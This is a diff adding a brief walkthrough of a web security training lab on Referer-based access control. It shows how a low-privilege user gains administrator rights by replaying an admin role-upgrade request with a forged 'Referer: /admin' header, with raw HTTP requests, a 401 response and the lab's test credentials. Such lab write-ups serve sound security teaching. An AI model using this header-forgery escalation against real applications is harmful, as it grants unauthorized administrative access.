@@ -1,0 +1,29 @@
+Lab: Referer-based access control
+
+Vulnerability: This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
+
+Goal: To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
+
+Analysis and Solution:
+1. Log in with credentials administrator:admin 
+=> acess /admin and make a request to upgrade carlos as an admin: GET /admin-roles?username=wiener&action=upgrade HTTP/2
+
+2. Notice that, in the request: GET /admin-roles?username=wiener&action=upgrade HTTP/2, Referer: .../admin 
+=> Try modify this Referer: /
+=> Error: 
+    HTTP/2 401 Unauthorized
+    Content-Type: application/json; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 14
+
+    "Unauthorized"
+=> This website applies access control based on the Referer header 
+=> We can forge a request with Referer header: /admin to upgrade or downgrade roles of users.
+
+3. Log in with credentials wiener:peter 
+=> Make a request: GET /admin-roles?username=wiener&action=upgrade HTTP/2
+with Referer: /admin 
+=> SUCCESSFULLY 
+
+
+
